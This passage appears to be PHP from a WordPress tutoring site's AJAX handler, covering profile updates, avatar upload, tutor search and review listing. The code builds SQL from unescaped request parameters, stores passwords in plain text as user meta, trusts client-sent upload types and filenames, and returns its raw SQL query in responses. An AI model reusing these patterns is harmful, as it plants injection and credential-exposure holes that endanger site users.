        if (isset($last_school) && trim($last_school) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'last_school', $last_school);
        }

        if (isset($previous_school) && trim($previous_school) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'previous_school', $previous_school);
        }

        if (isset($skype_id) && trim($skype_id) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'skype_id', $skype_id);
        }

        if (isset($user_profession) && trim($user_profession) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'user_profession', $user_profession);
        }

        if (isset($subject_type)) {
            if (count($subject_type) > 0) {
                $form_valid = true;
                $subject_type = implode(',', $subject_type);
                update_user_meta($current_user->ID, 'subject_type', $subject_type);
            }
        }

        if (isset($desc_tell_me) && trim($desc_tell_me) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'desc_tell_me', $desc_tell_me);
        }

        if (isset($user_grade) && trim($user_grade) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'user_grade', $user_grade);
        }

        if (isset($any_other) && trim($any_other) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'any_other', $any_other);
        }

        if (isset($school_link2) && trim($school_link2) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'school_link2', $school_link2);
        }

        if (isset($school_link1) && trim($school_link1) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'school_link1', $school_link1);
        }

        if (isset($school_name2) && trim($school_name2) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'school_name2', $school_name2);
        }

        if (isset($school_name1) && trim($school_name1) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'school_name1', $school_name1);
        }

        if (isset($user_major) && trim($user_major) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'user_major', $user_major);
        }

        if (isset($user_gpa) && trim($user_gpa) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'user_gpa', $user_gpa);
        }

        if (isset($school_attend) && trim($school_attend) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'school_attend', $school_attend);
        }

        if (isset($user_years) && trim($user_years) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'user_years', $user_years);
        }

        if (isset($student_link) && trim($student_link) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'student_link', $student_link);
        }

        if (isset($teaching_subject) && trim($teaching_subject) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'teaching_subject', $teaching_subject);
        }

        if (isset($teaching_link) && trim($teaching_link) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'teaching_link', $teaching_link);
        }

        if (isset($school_name) && trim($school_name) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'school_name', $school_name);
        }

        if (isset($subject_description) && trim($subject_description) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'subject_description', $subject_description);
        }

        if (isset($time_zone) && trim($time_zone) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'user_timezone', $time_zone);            
            update_user_meta($current_user->ID, 'time_zone_index', $time_zone_index);
            update_user_meta($current_user->ID, 'time_zone_name', $time_zone_name);
        }
        /*if($form_valid){
            $user = get_user_by('id', $current_user->ID);
            $user->add_role('mw_registered_teacher');            
            echo 1;
        }else{
            echo 0;
        }*/     
        $user = get_user_by('id', $current_user->ID);
        $user->add_role('mw_registered_teacher');            
        echo 1;   
    }else{
        $html = '';
        $form_valid = true;

        if ($new_password !== $retype_new_password) {
            $html .= __('Passwords must match', 'iii-dictionary');
            $html .= '<br/>';
            $form_valid = false;
        }

        if (trim($new_password) != '' && strlen($new_password) < 6) {
            $html .= __('Passwords must be at least six characters long', 'iii-dictionary');
            $html .= '<br/>';
            $form_valid = false;
        }

        if (trim($gender) == '') {
            $html .=  __('Please choose Gender', 'iii-dictionary');
            $html .= '<br/>';
            $form_valid = false;
        }
        if (trim($first_name) == '') {
            $html .=  __('Please enter First Name', 'iii-dictionary');
            $html .= '<br/>';
            $form_valid = false;
        }
        if (trim($last_name) == '') {
            $html .=  __('Please enter Last Name', 'iii-dictionary');
            $html .= '<br/>';
            $form_valid = false;
        }

        if ($cb_lang == '') {
            $html .=  __('Please choose Language', 'iii-dictionary');
            $html .= '<br/>';
            $form_valid = false;
        }

        if ($time_zone_index == '0') {
            $html .=  __('Please choose Timezone', 'iii-dictionary');
            $html .= '<br/>';
            $form_valid = false;
        }

        if ($birth_y != '' && is_numeric($birth_y)) {
            $y = date('Y',time()) - (int)$birth_y;
            if($y < 9){
                $html .= __('This Year is invalid. Please choose another one.', 'iii-dictionary');
                $html .= '<br/>';
                $form_valid = false;
            }else{
                if (checkdate($birth_m, $birth_d, $birth_y)) {
                    $date_of_birth = $birth_m . '/' . $birth_d . '/' . $birth_y;
                } else {
                    $html .= __('Invalid date of birth', 'iii-dictionary');
                    $html .= '<br/>';
                    $form_valid = false;
                }
            }
        } else {
            $date_of_birth = '';
        }

        if ($form_valid) {

            if (trim($user_email) != '' || trim($new_password) != '') {
                $userdata = array('ID' => $current_user->ID, 'user_pass' => $new_password);

                wp_update_user($userdata);
            }

            if (isset($mobile_number) && trim($mobile_number) != '') {
                update_user_meta($current_user->ID, 'mobile_number', $mobile_number);
            }

            if (isset($last_school) && trim($last_school) != '') {
                update_user_meta($current_user->ID, 'last_school', $last_school);
            }

            if (isset($previous_school) && trim($previous_school) != '') {
                update_user_meta($current_user->ID, 'previous_school', $previous_school);
            }

            if (isset($skype_id) && trim($skype_id) != '') {
                update_user_meta($current_user->ID, 'skype_id', $skype_id);
            }

            if (isset($user_profession) && trim($user_profession) != '') {
                update_user_meta($current_user->ID, 'user_profession', $user_profession);
            }

            if (isset($first_name) && trim($first_name) != '') {
                update_user_meta($current_user->ID, 'first_name', $first_name);
            }

            if (isset($last_name) && trim($last_name) != '') {
                update_user_meta($current_user->ID, 'last_name', $last_name);
            }

            if (isset($first_name) && trim($first_name) != '' && isset($last_name) && trim($last_name) != '') {
                $display_name = $first_name . ' ' . $last_name;
                update_user_meta($current_user->ID, 'display_name', $display_name);
            }

            if (isset($gender) && trim($gender) != '') {
                update_user_meta($current_user->ID, 'gender', $gender);
            }

            if (isset($profile_avatar) && trim($profile_avatar) != '') {
                update_user_meta($current_user->ID, 'ik_user_avatar', $profile_avatar);
            }

            if (isset($cb_lang)) {
                if (count($cb_lang) > 0) {
                    $language_type = implode(',', $cb_lang);
                    update_user_meta($current_user->ID, 'language_type', $language_type);
                }
            }

            if (isset($subject_type)) {
                if (count($subject_type) > 0) {
                    $subject_type = implode(',', $subject_type);
                    update_user_meta($current_user->ID, 'subject_type', $subject_type);
                }
            }

            if (isset($desc_tell_me) && trim($desc_tell_me) != '') {
                update_user_meta($current_user->ID, 'desc_tell_me', $desc_tell_me);
            }

            if (isset($user_grade) && trim($user_grade) != '') {
                update_user_meta($current_user->ID, 'user_grade', $user_grade);
            }

            if (isset($any_other) && trim($any_other) != '') {
                update_user_meta($current_user->ID, 'any_other', $any_other);
            }

            if (isset($school_link2) && trim($school_link2) != '') {
                update_user_meta($current_user->ID, 'school_link2', $school_link2);
            }

            if (isset($school_link1) && trim($school_link1) != '') {
                update_user_meta($current_user->ID, 'school_link1', $school_link1);
            }

            if (isset($school_name2) && trim($school_name2) != '') {
                update_user_meta($current_user->ID, 'school_name2', $school_name2);
            }

            if (isset($school_name1) && trim($school_name1) != '') {
                update_user_meta($current_user->ID, 'school_name1', $school_name1);
            }

            if (isset($user_major) && trim($user_major) != '') {
                update_user_meta($current_user->ID, 'user_major', $user_major);
            }

            if (isset($user_gpa) && trim($user_gpa) != '') {
                update_user_meta($current_user->ID, 'user_gpa', $user_gpa);
            }

            if (isset($school_attend) && trim($school_attend) != '') {
                update_user_meta($current_user->ID, 'school_attend', $school_attend);
            }

            if (isset($user_years) && trim($user_years) != '') {
                update_user_meta($current_user->ID, 'user_years', $user_years);
            }

            if (isset($student_link) && trim($student_link) != '') {
                update_user_meta($current_user->ID, 'student_link', $student_link);
            }

            if (isset($teaching_subject) && trim($teaching_subject) != '') {
                update_user_meta($current_user->ID, 'teaching_subject', $teaching_subject);
            }

            if (isset($teaching_link) && trim($teaching_link) != '') {
                update_user_meta($current_user->ID, 'teaching_link', $teaching_link);
            }

            if (isset($school_name) && trim($school_name) != '') {
                update_user_meta($current_user->ID, 'school_name', $school_name);
            }

            if (isset($subject_description) && trim($subject_description) != '') {
                update_user_meta($current_user->ID, 'subject_description', $subject_description);
            }

            if (isset($time_zone) && trim($time_zone) != '') {
                update_user_meta($current_user->ID, 'user_timezone', $time_zone);
                update_user_meta($current_user->ID, 'time_zone_index', $time_zone_index);
                update_user_meta($current_user->ID, 'time_zone_name', $time_zone_name);
            }

            update_user_meta($current_user->ID, 'date_of_birth', $date_of_birth);

            update_user_meta($current_user->ID, 'user_password', $new_password);
       
            echo 1;
        } else {
            echo $html;
        }
    }
    exit();
}
if ($task == "upload_avatar") {

    $file = $_FILES['file'];
    $current_user = wp_get_current_user();
    if (isset($current_user->user_login)) {
        $user_dir = $current_user->user_login;
    } else {
        $user_dir = 'avatar';
    }
    if ($file['error'] == UPLOAD_ERR_OK) {
        $allowedTypes = array('image/png', 'image/jpeg', 'image/gif');
        $error = !in_array($file['type'], $allowedTypes);
        if (!$error) {
            $wp_upload_dir = wp_upload_dir();
            $avatar_file_name = str_replace(' ', '_', $file['name']);
            $upload_dir = $wp_upload_dir['basedir'] . '/' . $user_dir . '/';
            if (!is_dir($upload_dir)) {
                mkdir($upload_dir);
            }

            if (move_uploaded_file($file['tmp_name'], $upload_dir . $avatar_file_name)) {
                $avatar_url = $wp_upload_dir['baseurl'] . '/' . $user_dir . '/' . $avatar_file_name;
                echo $avatar_url;
            } else {
                echo '0';
            }
        } else {
            echo '0';
        }
    } else {
        echo '0';
    }
    die;
}

if($task == "search_tutor"){
    $search = $_REQUEST['search'];
    $time_zone = $_REQUEST['time_zone'];
    $description = $_REQUEST['description'];
    $subject_type = $_REQUEST['subject_type'];
    $type = $_REQUEST['type'];
    $time = $_REQUEST['time'];
    $date = $_REQUEST['date'];
    $type_search = $_REQUEST['type_search'];
    $available = $_REQUEST['available'];
    $pricet = $_REQUEST['pricet'];
    $tutor_type = $_REQUEST['tutor_type'];

    $roles = array('mw_registered_teacher','mw_qualified_teacher','mw_registered_math_teacher','mw_qualified_math_teacher');
    foreach ($roles as $role) {
        $role_cond[] = 'meta_key = \'' . $wpdb->prefix . 'capabilities\' AND meta_value LIKE \'%' . $role . '%\'';
    }    

    $where = 'AND A.ID IN (SELECT user_id FROM ' . $wpdb->usermeta . ' WHERE ' . implode(' OR ', $role_cond) . ')';

    if($description != ''){
        $desc_cond[] = 'meta_key = \'desc_tell_me\' AND meta_value LIKE \'%' . $description . '%\'';
        $desc_cond[] = 'meta_key = \'subject_description\' AND meta_value LIKE \'%' . $description . '%\'';
        $where .= ' AND A.ID IN (SELECT user_id FROM ' . $wpdb->usermeta . ' WHERE ' . implode(' OR ', $desc_cond) . ')';
    }

    if($type == 'fromclass'){
        if($subject_type != 0 || $subject_type != 'all'){
            $subject_arr = explode('|', $subject_type);
            if(isset($subject_arr[1]) && $subject_arr[1] != 'all'){
                $sub_cond = 'meta_key = \''.$subject_arr[0].'\' AND meta_value LIKE \'%' . $subject_arr[1] . '%\'';
                $where .= ' AND A.ID IN (SELECT user_id FROM ' . $wpdb->usermeta . ' WHERE ' . $sub_cond . ')';
            }else{
                if(isset($subject_arr[0]) && $subject_arr[0] = 'english_subject')
                    $sub_arr = array('english_conversation','english_grammar','english_writting','english_reading_comprehension','others');
                else if(isset($subject_arr[0]) && $subject_arr[0] = 'math_subject')
                    $sub_arr = array('elemenatary_school_math','middle_school_math','high_school_math','advanced_math','others');
                else if(isset($subject_arr[0]) && $subject_arr[0] = 'science_subject')
                    $sub_arr = array('science_middle_school','physics_high_school','chemistry_high_school','others');
                else
                    $sub_arr = array('other_preference');

                if(count($sub_arr) > 0){
                    foreach ($sub_arr as $sub) {
                        $sub_cond[] = 'meta_key = \''.$subject_arr[0].'\' AND meta_value LIKE \'%' . $sub . '%\'';
                    }
                    $where .= ' AND A.ID IN (SELECT user_id FROM ' . $wpdb->usermeta . ' WHERE ' . implode(' OR ', $sub_cond) . ')';
                }
            }
        }else{
            if($subject_type == 'all'){
                $sub_arr = array('english_conversation','english_grammar','english_writting','english_reading_comprehension','others');
                foreach ($sub_arr as $sub) {
                    $sub_cond[] = 'meta_key = \'english_subject\' AND meta_value LIKE \'%' . $sub . '%\'';
                }

                $sub_arr1 = array('elemenatary_school_math','middle_school_math','high_school_math','advanced_math','others');
                foreach ($sub_arr1 as $sub1) {
                    $sub_cond[] = 'meta_key = \'math_subject\' AND meta_value LIKE \'%' . $sub1 . '%\'';
                }

                $sub_arr2 = array('science_middle_school','physics_high_school','chemistry_high_school','others');
                foreach ($sub_arr2 as $sub2) {
                    $sub_cond[] = 'meta_key = \'science_subject\' AND meta_value LIKE \'%' . $sub2 . '%\'';
                }
                $where .= ' AND A.ID IN (SELECT user_id FROM ' . $wpdb->usermeta . ' WHERE ' . implode(' OR ', $sub_cond) . ')';
            }
        }
    }else{
       if($subject_type != ''){
            foreach ($subject_type as $sub) {
                $sub_cond[] = 'meta_key = \'subject_type\' AND meta_value LIKE \'%' . $sub . '%\'';
            }
            $where .= ' AND A.ID IN (SELECT user_id FROM ' . $wpdb->usermeta . ' WHERE ' . implode(' OR ', $sub_cond) . ')';
        } 
    }

    if(($type == 'available' || $available == 'available') ){
        $where .= ' AND A.ID IN (SELECT tutor_id FROM ' . $wpdb->prefix . 'dict_tutoring_available GROUP BY tutor_id)';
    }    

    if($search != ''){
        $where .= ' AND (A.display_name LIKE \'%' . esc_sql($search) . '%\' OR A.user_login LIKE \'%' . esc_sql($search) . '%\' OR user_email LIKE \'%' . esc_sql($search) . '%\')';
    }

    if($date != ''){
        $where .= ' AND B.date = \''.$date.'\'';
    }

    if($time != ''){
        $where .= ' AND B.time_start = \''.$time.'\'';
    }

    $rquery = 'SELECT A.ID, A.user_email, A.display_name, A.user_registered, B.enable_one_tutoring, B.enable_group_tutoring, B.subject_name, B.subject_type FROM ' . $wpdb->users . ' AS A JOIN ' . $wpdb->prefix . 'dict_tutoring_available AS B ON A.ID = B.tutor_id';
    $rquery .= ' WHERE TRUE '. $where;
    $rquery .= ' GROUP BY A.ID ORDER BY A.user_registered DESC';
    //echo $query;
    $users = $wpdb->get_results($rquery);
    $arr_user2 = $arr_user1 = $arr_user = array();
    $current_user = wp_get_current_user();
    if(count($users) > 0){
        $item = array();
        $subject_type_update = array();
        foreach ($users as $key => $value) {
            $profile_value = get_user_meta($value->ID, 'ik_user_avatar', true);
            $display_name = get_user_meta($value->ID, 'display_name', true);
            $first_name = get_user_meta($value->ID, 'first_name', true);
            $last_name = get_user_meta($value->ID, 'last_name', true);
            $desc_tell_me = get_user_meta($value->ID, 'desc_tell_me', true);
            $subject_description = get_user_meta($value->ID, 'subject_description', true);
            $school_name = get_user_meta($value->ID, 'school_name', true);
            $school_name_05 = get_user_meta($value->ID, 'school_name_05', true);
            $school_name_02 = get_user_meta($value->ID, 'school_name_02', true);
            $school_name_03 = get_user_meta($value->ID, 'school_name_03', true);
            $school_name_04 = get_user_meta($value->ID, 'school_name_04', true);
            $teaching_link = get_user_meta($value->ID, 'teaching_link', true);
            $teaching_subject = get_user_meta($value->ID, 'teaching_subject', true);
            $teaching_subject_02 = get_user_meta($value->ID, 'teaching_subject_02', true);
            $teaching_subject_03 = get_user_meta($value->ID, 'teaching_subject_03', true);
            $teaching_subject_04 = get_user_meta($value->ID, 'teaching_subject_04', true);
            $teaching_subject_05 = get_user_meta($value->ID, 'teaching_subject_05', true);
            $student_link = get_user_meta($value->ID, 'student_link', true);
            $user_years = get_user_meta($value->ID, 'user_years', true);
            $school_attend = get_user_meta($value->ID, 'school_attend', true);
            $user_gpa = get_user_meta($value->ID, 'user_gpa', true);
            $user_grade = get_user_meta($value->ID, 'user_grade', true);
            $user_major = get_user_meta($value->ID, 'user_major', true);
            $school_name1 = get_user_meta($value->ID, 'school_name1', true);
            $school_name2 = get_user_meta($value->ID, 'school_name2', true);
            $school_name3 = get_user_meta($value->ID, 'school_name3', true);
            $school_name4 = get_user_meta($value->ID, 'school_name4', true);
            $school_name5 = get_user_meta($value->ID, 'school_name5', true);
            $school_link1 = get_user_meta($value->ID, 'school_link1', true);
            $school_link2 = get_user_meta($value->ID, 'school_link2', true);            
            $school_link3 = get_user_meta($value->ID, 'school_link3', true);
            $school_link4 = get_user_meta($value->ID, 'school_link4', true);
            $school_link5 = get_user_meta($value->ID, 'school_link5', true);
            $any_other = get_user_meta($value->ID, 'any_other', true);
            $previous_school = get_user_meta($value->ID, 'previous_school', true);
            $up_price_one = get_user_meta($value->ID, 'price_array', true);
            $up_price_group = get_user_meta($value->ID, 'group_price_array', true);
            $keyprice = $date.$time;
            $price_one = $up_price_one[$keyprice];
            $price_group = $up_price_group[$keyprice];

            if (!empty($profile_value))
                $user_avatar = $profile_value;
            else
                $user_avatar = get_template_directory_uri().'/library/images/icon_Tutor_ID.png';

            $english_subject = get_user_meta($value->ID, 'english_subject', true);
            $english_subject_desc = get_user_meta($value->ID, 'english_subject_desc', true);

            $math_subject = get_user_meta($value->ID, 'math_subject', true);
            $math_subject_desc = get_user_meta($value->ID, 'math_subject_desc', true);

            $science_subject = get_user_meta($value->ID, 'science_subject', true);
            $science_subject_desc = get_user_meta($value->ID, 'science_subject_desc', true);

            $description_preference = get_user_meta($value->ID, 'description_preference', true);
            $other_preference = get_user_meta($value->ID, 'other_preference', true);
            $main_image = get_user_meta($value->ID, 'main_image', true);
            $price_tutoring = get_user_meta($value->ID, 'price_tutoring', true);
            $price_group_tutoring = get_user_meta($value->ID, 'price_group_tutoring', true);
            $taget_tutor = get_user_meta($value->ID, 'previous_school', true);
            $price_tutoring = empty($price_tutoring)? 15 : $price_tutoring;

            $user_subject = '';
            $subject_type_update = array();
            if (!empty($english_subject) && $english_subject != '') {
                $subs_english = array(
                    'english_conversation' => 'English: Conversation for Foreign Students',
                    'english_grammar' => 'English: English Grammar',
                    'english_writting' => 'English: English Writting',            
                    'english_reading_comprehension' => 'English: English Reading Comprehension',
                    'others' => 'English: Others'
                );
                $subjects_english = explode(',', $english_subject);                
                if (count($subjects_english) > 0) {
                    $n = count($subjects_english) - 1;
                    for ($i = 0; $i < count($subjects_english); $i++) {
                        $key = $subjects_english[$i];
                        if($key == 'others'){
                            if($english_subject_desc != ''){
                                $subject_type_update[] = $subs_english[$key].' '.$english_subject_desc;
                            }else{
                                $subject_type_update[] = $subs_english[$key];
                            }
                        }else{
                            $subject_type_update[] = $subs_english[$key];
                        }
                        
                        if (count($subjects_english) > 1 && $i < $n)
                            $user_subject .= ', ';
                    }
                }
            }

            if (!empty($math_subject) && $math_subject != '') {
                $subs_math = array( 
                    'elemenatary_school_math' => 'Math: Elemenatary School Math',
                    'middle_school_math' => 'Math: Middle School Math',
                    'high_school_math' => 'Math: High School Math',
                    'advanced_math' => 'Math: Advanced Math',
                    'others' => 'Math: Others'
                );
                $subjects_math = explode(',', $math_subject);                
                if (count($subjects_math) > 0) {
                    $n = count($subjects_math) - 1;
                    for ($i = 0; $i < count($subjects_math); $i++) {
                        $key = $subjects_math[$i];
                        if($key == 'others'){
                            if($math_subject_desc != ''){
                                $subject_type_update[] = $subs_math[$key].' '.$math_subject_desc;
                            }else{
                                $subject_type_update[] = $subs_math[$key];
                            }
                        }else{
                            $subject_type_update[] = $subs_math[$key];
                        }
                        if (count($subjects_math) > 1 && $i < $n)
                            $user_subject .= ', ';
                    }
                }
            }

            if (!empty($science_subject) && $science_subject != '') {
                $subs_science = array( 
                    'science_middle_school' => 'Science: Science of Middle, Elementary School',
                    'physics_high_school' => 'Science: Physics for High School',
                    'chemistry_high_school' => 'Science: Chemistry for High School',
                    'others' => 'Science: Others'
                );
                $subjects_science = explode(',', $science_subject);                
                if (count($subjects_science) > 0) {
                    $n = count($subjects_science) - 1;
                    for ($i = 0; $i < count($subjects_science); $i++) {
                        $key = $subjects_science[$i];
                        if($key == 'others'){
                            if($science_subject_desc != ''){
                                $subject_type_update[] = $subs_science[$key].' '.$science_subject_desc;
                            }else{
                                $subject_type_update[] = $subs_science[$key];
                            }
                        }else{
                            $subject_type_update[] = $subs_science[$key];
                        }
                        if (count($subjects_science) > 1 && $i < $n)
                            $user_subject .= ', ';
                    }
                }
            }

            if($other_preference != ''){
                if($description_preference != ''){
                    $subject_type_update[] = 'Others '.$description_preference;
                }else{
                    $subject_type_update[] = 'Others';
                }
            }

            $user_subject = implode(', ', $subject_type_update);
            $user_subject = wp_trim_words($user_subject,12);

            $book_mark = get_user_meta($value->ID, 'book_mark', true);
            $favorite = 0;
            $arr_favorite = array();
            if (!empty($book_mark) && $book_mark != ''){
                $arr_favorite = explode(',', $book_mark);
                foreach ($arr_favorite as $key => $val) {
                    if($val == $current_user->ID){
                        $favorite = 1;
                    }
                }
            }

            $query = 'SELECT rv.* FROM ' . $wpdb->prefix . 'dict_tutor_review AS rv WHERE rv.review_id = '.$value->ID;
            $reviews = $wpdb->get_results($query);
            $star = 0;
            $cnt = count($reviews);
            $arr_review = array();
            if(count($reviews) > 0){
                $itemrv = array();
                foreach ($reviews as $key => $vr) {
                    $review_uname = get_user_by('id', $vr->userid);
                    $review_dname = get_user_meta($vr->userid, 'display_name', true);
                    $star += $vr->star;
                    $itemrv['id'] = $vr->id;
                    $itemrv['review_id'] = $vr->review_id;
                    $itemrv['star'] = $vr->star;
                    $itemrv['userid'] = $vr->userid;
                    $itemrv['subject'] = $vr->subject;
                    $itemrv['message'] = $vr->message;
                    if($review_dname)
                        $itemrv['review_name'] = $review_dname;
                    else
                        $itemrv['review_name'] = $review_uname->display_name;
                    $arr_review[] = $itemrv;
                }
            }
                 
            if($cnt == 0)
                $total_star = $star;
            else
                $total_star = ceil($star/$cnt);

            $query1 = 'SELECT id FROM ' . $wpdb->prefix . 'dict_groups WHERE created_by = '.$value->ID;
            $rows = $wpdb->get_results($query1);
            $fromclass = count($rows);
            //$cnt = $cnt + $fromclass + $favorite;

            if (!empty($display_name) && $display_name != '')
                $user_name = $display_name;
            else if((!empty($first_name) && $first_name != '') || (!empty($last_name) && $last_name != ''))
                $user_name = $first_name.' '.$last_name;
            else
                $user_name = $value->display_name;

            $item['ID'] = $value->ID;
            $item['query'] =  $rquery;
            $item['user_email'] = $value->user_email;
            $item['display_name'] = $user_name;
            $item['user_registered'] = $value->user_registered;
            $item['user_avatar'] = $user_avatar;
            $item['user_subject'] = $user_subject;
            $item['star'] = $total_star;
            $item['favorite'] = $favorite;
            $item['fromclass'] = $fromclass;
            $item['user_favorites'] = $arr_favorite;
            $item['cnt'] = $cnt;
            $item['reviews'] = $arr_review;
            $item['desc_tell_me'] =  $desc_tell_me;
            $item['subject_type'] =  $subject_type_update;
            $item['school_name'] =  $school_name;
            $item['school_name_02'] =  $school_name_02;
            $item['school_name_03'] =  $school_name_03;
            $item['school_name_04'] =  $school_name_04;
            $item['school_name_05'] =  $school_name_05;
            $item['teaching_link'] =  $teaching_link;
            $item['teaching_subject'] =  $teaching_subject;
            $item['teaching_subject_02'] =  $teaching_subject_02;
            $item['teaching_subject_03'] =  $teaching_subject_03;
            $item['teaching_subject_04'] =  $teaching_subject_04;
            $item['teaching_subject_05'] =  $teaching_subject_05;
            $item['user_years'] =  $user_years;
            $item['school_attend'] =  $school_attend;
            $item['student_link'] =  $student_link;
            $item['user_gpa'] =  $user_gpa;
            $item['user_grade'] =  $user_grade;
            $item['user_major'] =  $user_major;
            $item['school_name1'] =  $school_name1;
            $item['school_name2'] =  $school_name2;
            $item['school_name3'] =  $school_name3;
            $item['school_name4'] =  $school_name4;
            $item['school_name5'] =  $school_name5;
            $item['school_link1'] =  $school_link1;
            $item['school_link2'] =  $school_link2;
            $item['school_link3'] =  $school_link3;
            $item['school_link4'] =  $school_link4;
            $item['school_link5'] =  $school_link5;
            $item['previous_school'] =  $previous_school;
            $item['any_other'] =  $any_other;
            $item['subject_description'] =  $subject_description;
            $item['price_tutoring'] = $price_tutoring;
            $item['price_group_tutoring'] = $price_group_tutoring;
            $item['taget_tutor'] = $taget_tutor;
            $item['MAGIC']="MAGIC";
            $item['enable_one_tutoring'] = $value->enable_one_tutoring;
            $item['enable_group_tutoring'] = $value->enable_group_tutoring;
            $item['main_image'] = $main_image;
            $item['tutoring_subject'] = $value->subject_name;
            $item['tutoring_subject_type'] = $value->subject_type;
            $item['up_price_one'] = $price_one;
            $item['up_price_group'] = $price_group;


            // if($type == 'favorite' && $favorite > 0){
            //     $arr_user1[] = $item;
            // }else{
            //     if($type_search[0] == 'favorite' && $favorite > 0){
            //         $arr_user2[] = $item;
            //     }else if($type_search[0] == 'rating' && $total_star > 0){
            //         $arr_user2[] = $item;
            //     }else if(count($type_search) == 2 && ($favorite > 0 || $total_star > 0)){
            //         $arr_user2[] = $item;
            //     }else{
            //         $arr_user2[] = $arr_user[] = $item;
            //     }
            // }
            $sub_type = $value->subject_type;
            $sub_type = explode("|", $sub_type);
            $a = 0;
            $sub_type2 = explode("|", $subject_type);
            if($sub_type[0] == $sub_type2[0]){
                if($sub_type2[1] == 'all'){
                    $a++;
                }elseif($sub_type[1] == $sub_type2[1]){
                    $a++;
                }
            }elseif ($sub_type[0] == 'all' || $sub_type2[0] =='all') {
                $a++;
            }elseif($sub_type[0] == ''){
                $a++;
            }
            if($a != 0){               
            
                if($value->enable_group_tutoring == 'timelot_group_tutoring' && $tutor_type == 'group_tutoring'){
                    $price1 = $item['up_price_group'];            
                    if($pricet == '0'){
                         $arr_user2[] = $arr_user[] = $item;
                    }else if($pricet == '50') {
                         if($pricet < $price1){
                            $arr_user2[] = $arr_user[] = $item;
                         }
                    }else{
                        $pricer = explode("-", $pricet);
                        if($pricer[0] < $price1 && $price1 < $pricer[1]){
                        $arr_user2[] = $arr_user[] = $item;
                        }
                    }
                }elseif($value->enable_group_tutoring != 'timelot_group_tutoring' && $tutor_type == 'one_tutoring'){
                    $price1 = $item['up_price_one'];
                    if($pricet == '0'){
                         $arr_user2[] = $arr_user[] = $item;
                    }else if($pricet == '50') {
                         if($pricet < $price1){
                            $arr_user2[] = $arr_user[] = $item;
                         }
                    }else{
                        $pricer = explode("-", $pricet);
                        if($pricer[0] < $price1 && $price1 < $pricer[1]){
                        $arr_user2[] = $arr_user[] = $item;
                        }
                    }
                }elseif($tutor_type == '0'){
                    if($value->enable_group_tutoring == 'timelot_group_tutoring'){
                        $price1 = $item['up_price_group'];
                    }else{
                        $price1 = $item['up_price_one'];
                    }
                    if($pricet == '0'){
                         $arr_user2[] = $arr_user[] = $item;
                    }else if($pricet == '50') {
                         if($pricet < $price1){
                            $arr_user2[] = $arr_user[] = $item;
                         }
                    }else{
                        $pricer = explode("-", $pricet);
                        if($pricer[0] < $price1 && $price1 < $pricer[1]){
                        $arr_user2[] = $arr_user[] = $item;
                        }
                    }
                }
            }
            
        }
    }
    //$arr_user = unique_multidim_array('ID',$arr_user);
    //$arr_user1 = unique_multidim_array('ID',$arr_user1);
    //$arr_user2 = unique_multidim_array('ID',$arr_user2);
    if($type == 'review'){
        array_multisort(
            array_column($arr_user, 'star'), SORT_NUMERIC, SORT_DESC,
            $arr_user
        );
        echo json_encode(array('users' => $arr_user));
    }else if($type == 'favorite'){
        array_multisort(
            array_column($arr_user1, 'favorite'), SORT_NUMERIC, SORT_DESC,
            $arr_user1
        );
        echo json_encode(array('users' => $arr_user1));
    }else if($type == 'fromclass'){
        array_multisort(
            array_column($arr_user2, 'fromclass'), SORT_NUMERIC, SORT_DESC,
            $arr_user2
        );
        echo json_encode(array('users' => $arr_user2));
    }else{
        echo json_encode(array('users' => $arr_user));
    }
    die;
}
if ($task == "get_users_reviews") {
    $tutor_id = $_REQUEST['tutor_id'];
    $type = $_REQUEST['type'];
    $query = 'SELECT rv.* FROM ' . $wpdb->prefix . 'dict_tutor_review AS rv WHERE rv.review_id = '.$tutor_id;
    $reviews = $wpdb->get_results($query);
    $star = 0;
    $cnt = count($reviews);
    $arr_review = array();
    if(count($reviews) > 0){
        $itemrv = array();
        foreach ($reviews as $key => $vr) {
            $review_uname = get_user_by('id', $vr->userid);
            $review_dname = get_user_meta($vr->userid, 'display_name', true);
            $star += $vr->star;
            $itemrv['id'] = $vr->id;
            $itemrv['review_id'] = $vr->review_id;
            $itemrv['star'] = $vr->star;
            $itemrv['userid'] = $vr->userid;
            $itemrv['subject'] = $vr->subject;
            $itemrv['message'] = $vr->message;
            if($review_dname)
                $itemrv['review_name'] = $review_dname;
            else
                $itemrv['review_name'] = $review_uname->display_name;
            $arr_review[] = $itemrv;
        }
    }
    if($type == 'lowstar'){
        array_multisort(
        array_column($arr_review, 'star'), SORT_NUMERIC, SORT_ASC,
        $arr_review
        );
    }
    if ($type == 'highstar') {
         array_multisort(
        array_column($arr_review, 'star'), SORT_NUMERIC, SORT_DESC,
        $arr_review
        );
    }
    if($type == 'normal'){
        rsort($arr_review);
    }
    
    
    echo json_encode(array('reviews' => $arr_review));
    die;
}

if ($task == "get_users_tutor") {
    $search = $_REQUEST['search'];
    $time_zone = $_REQUEST['time_zone'];
    $description = $_REQUEST['description'];
    $subject_type = $_REQUEST['subject_type'];
    $type = $_REQUEST['type'];
    $time = $_REQUEST['time'];
    $date = $_REQUEST['date'];
    $type_search = $_REQUEST['type_search'];
    $available = $_REQUEST['available'];

    $roles = array('mw_registered_teacher','mw_qualified_teacher','mw_registered_math_teacher','mw_qualified_math_teacher');
    foreach ($roles as $role) {
        $role_cond[] = 'meta_key = \'' . $wpdb->prefix . 'capabilities\' AND meta_value LIKE \'%' . $role . '%\'';
    }    

